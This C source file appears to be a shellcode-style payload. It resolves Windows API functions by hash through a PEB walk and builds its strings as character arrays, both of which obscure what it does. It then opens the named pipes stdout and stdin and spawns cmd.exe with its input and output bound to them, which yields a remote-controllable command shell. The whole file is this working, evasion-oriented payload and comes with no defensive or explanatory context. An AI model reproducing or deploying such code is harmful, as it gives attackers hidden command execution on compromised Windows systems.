#include "peb_lookup.h"
#include "debug.h"

typedef HANDLE(WINAPI* _CreateFileA)(
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile);

typedef BOOL(WINAPI* _CreateProcessA)(
    _In_opt_ LPCSTR lpApplicationName,
    _Inout_opt_ LPSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOA lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation);

int main() {
    // kernel32.dll
    void* module = GetModuleByHash(0x7040ee75);
    if (!module) {
        return 1;
    }

    // Initialise debug printing
    DebugInitialise(module);
    
    DefineImportedFuncPtrByHash(module, CreateFileA, 0xeb96c5fa);
    DefineImportedFuncPtrByHash(module, CreateProcessA, 0xaeb52e19);

    char pipeStdOutString[] = { '\\', '\\', '.', '\\', 'p', 'i', 'p', 'e', '\\', 's', 't', 'd', 'o', 'u', 't', '\0' };
    char pipeStdInString[] = { '\\', '\\', '.', '\\', 'p', 'i', 'p', 'e', '\\', 's', 't', 'd', 'i', 'n', '\0' };

    SECURITY_ATTRIBUTES saAttr;

    SecureZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE stdOutPipe = CreateFileAFuncPtr(
        pipeStdOutString,
        GENERIC_WRITE, 
        0, 
        &saAttr, 
        OPEN_EXISTING, 
        0, 
        NULL);
    if (stdOutPipe == INVALID_HANDLE_VALUE) {
        return 2;
    }

    HANDLE stdInPipe = CreateFileAFuncPtr(
        pipeStdInString,
        GENERIC_READ,
        0,
        &saAttr,
        OPEN_EXISTING,
        0,
        NULL);
    if (stdInPipe == INVALID_HANDLE_VALUE) {
        return 3;
    }

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFOA siStartInfo;

    SecureZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    SecureZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = stdOutPipe;
    siStartInfo.hStdOutput = stdOutPipe;
    siStartInfo.hStdInput = stdInPipe;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    char commandLineString[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e', '\0' };

    const BOOL success = CreateProcessAFuncPtr(
        NULL,
        commandLineString,
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &siStartInfo,
        &piProcInfo);

    if (!success) {
        return 4;
    }

    //Sleep(60000);

    //CloseHandle(hPipeOut);
    //CloseHandle(hPipeIn);

    //CloseHandle(piProcInfo.hProcess);
    //CloseHandle(piProcInfo.hThread);

	return 0;
}